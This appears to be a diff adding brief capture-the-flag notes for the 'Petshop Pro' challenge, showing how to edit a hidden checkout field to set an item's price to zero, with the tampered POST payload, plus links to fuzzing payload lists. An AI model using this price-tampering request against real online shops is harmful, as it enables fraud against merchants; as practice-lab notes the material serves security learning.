@@ -1,0 +1,16 @@
+Petshop Pro
+
+Flag0:
+add item to cart and check out
+post request data is coming from hidden field in the form
+set prize to 0 and resend request
+flag will be in the response
+
+POST http://35.196.135.216/31f22243f1/checkout
+Payload cart=[[1,+{"logo":+"puppy.jpg",+"price":+0.00,+"name":+"Puppy",+"desc":+"8\"x10\"+color+glossy+photograph+of+a+puppy."}]]
+
+
+
+some fuzzing lists:
+https://github.com/1N3/IntruderPayloads
+https://github.com/danielmiessler/SecLists
